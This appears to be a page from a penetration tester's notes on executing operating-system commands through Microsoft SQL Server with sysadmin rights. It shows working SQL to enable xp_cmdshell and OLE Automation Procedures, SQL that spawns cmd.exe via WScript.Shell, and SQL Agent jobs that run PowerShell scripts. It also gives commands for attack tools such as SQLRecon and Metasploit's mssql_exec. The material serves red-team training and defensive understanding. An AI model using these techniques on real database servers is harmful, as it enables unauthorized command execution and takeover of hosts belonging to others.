# Execute Commands

{% hint style="info" %}
_Only sysadmins can execute system OS commands._&#x20;
{% endhint %}

## Using xp\_cmdshell

### Using SQL terminal (Manual)

#### **Actual Concept:**&#x20;

```sql
SQL query → SQL engine → Windows OS → command execution → output back to SQL
```

#### Check if you're a sysadmin

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
GO
--> 1 --> enabled
--> 2 --> disabled
```

#### Check if xp\_cmdshell is enabled&#x20;

```sql
SELECT name,value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
GO
--> 1 --> enabled
--> 2 --> disabled
```

#### Enable \`xp\_cmdshell\` if disabled

```sql
USE master;
GO
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
GO
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO
```

#### Execute Command

<figure><img src="../../../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

### Using PowerUpSQL&#x20;

Actually in the backend same thing is hapenning when we use PowerUpSQL.&#x20;

<figure><img src="../../../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

### Using Impacket-toolkit

<figure><img src="../../../../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

By modifying the value of the `xp_cmdshell` we can execute commands as higher authority user on remote machine.&#x20;

### Using mssqlpwner

**It will try to do everything it can to execute commands.**&#x20;

{% hint style="info" %}
_Interactive mode is great._&#x20;
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

### Using SQLRecon

{% code overflow="wrap" %}
```powershell
.\SqlRecon /a:WinToken /h:DBSRV01 /i:sa /m:enableXp

.\SqlRecon /a:WinToken /h:DBSRV01 /i:sa /m:XpCmd /c:"powershell.exe -c C:\Users]ProvideInfo.ps1"
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Using Metasploit

```
use auxiliary/admin/mssql/mssql_exec
```

<figure><img src="../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

### Using OLE Automation Procedures&#x20;

### Using SQL Terminal (Manual)

#### Check status&#x20;

```sql
EXEC sp_configure 'Ole Automation Procedures';
```

If disabled then use:&#x20;

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
```

<figure><img src="../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

#### Method - 1 Execute Command via Wscript.Shell (Fire and Forget)&#x20;

```sql
DECLARE @obj INT;
DECLARE @result INT;

EXEC sp_OACreate 'WScript.Shell', @obj OUT;

EXEC sp_OAMethod @obj, 'Run', NULL,
     'cmd.exe /c whoami > C:\Temp\ole.txt', 0, TRUE;

EXEC sp_OADestroy @obj;
```

<figure><img src="../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

#### Method - 2 Capture Command Output directly&#x20;

```sql
DECLARE @obj INT;
DECLARE @stdout INT;
DECLARE @text VARCHAR(8000);

EXEC sp_OACreate 'WScript.Shell', @obj OUT;
EXEC sp_OAMethod @obj, 'Exec', @stdout OUT, 'cmd.exe /c whoami';

EXEC sp_OAMethod @stdout, 'StdOut.ReadAll', @text OUTPUT;

SELECT @text;

EXEC sp_OADestroy @obj;
```

<figure><img src="../../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

### Using SQLRecon

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Using OLE Automation Procedures&#x20;

<figure><img src="../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

## Using SQL Agents&#x20;

### Using SQL Terminal (Manual)

SQL Agent is available only in **named instances** and in the **Developer edition** of SQL Server; it is **not available in the Express edition**.

#### Confirm Agent is Running&#x20;

```sql
SELECT servicename, status_desc 
FROM sys.dm_server_services
WHERE servicename LIKE '%Agent%';
```

**Check which account:**&#x20;

```sql
SELECT servicename, service_account 
FROM sys.dm_server_services;
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Thus our SQL Agents are running with service accounts.&#x20;

#### Create a Job&#x20;

```sql
USE msdb;
GO

EXEC sp_add_job 
    @job_name = 'Run_PowerShell_Script';
```

#### Add PowerShell Job Step&#x20;

```sql
EXEC sp_add_jobstep
    @job_name = 'Run_PowerShell_Script',
    @step_name = 'Execute_PS1',
    @subsystem = 'PowerShell',
    @command = 'C:\Users\provideInfo.ps1';
```

#### Attach Job to Server and execute&#x20;

```sql
EXEC sp_add_jobserver 
    @job_name = 'Run_PowerShell_Script';

EXEC sp_start_job @job_name = 'Run_PowerShell_Script';
```

<figure><img src="../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
